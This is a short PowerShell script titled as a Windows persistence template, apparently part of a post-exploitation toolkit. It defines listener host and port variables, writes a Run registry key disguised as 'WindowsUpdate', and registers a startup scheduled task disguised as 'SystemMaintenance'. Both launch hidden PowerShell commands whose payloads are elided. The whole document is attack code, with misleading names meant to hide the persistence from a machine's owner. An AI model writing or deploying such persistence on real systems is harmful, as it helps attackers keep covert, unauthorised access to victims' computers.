# Windows Persistence Template
$LHOST = "127.0.0.1"
$LPORT = 4444

# Registry persistence
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -Command ..." -Force

# Scheduled task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command ..."
$Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $Action -Trigger $Trigger -Force
